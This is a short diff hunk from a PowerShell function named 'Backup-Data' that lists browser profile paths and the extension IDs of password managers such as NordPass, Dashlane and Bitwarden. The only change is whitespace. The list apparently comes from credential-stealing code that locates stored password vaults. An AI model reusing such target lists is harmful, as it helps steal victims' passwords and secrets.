@@ -786,7 +786,7 @@ function Backup-Data {
         "Yandex"       = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
     }
     $password_mgr_dirs = @{
-        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"
+        "bhghoamapcdpbohphigoooaddinpkbai" = "Authenticator"                    
 		"eiaeiblijfjekdanodkjadfinkhbfgcd" = "NordPass"
 		"fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane"
 		"nngceckbapebfimnlniiiahkandclblb" = "Bitwarden"
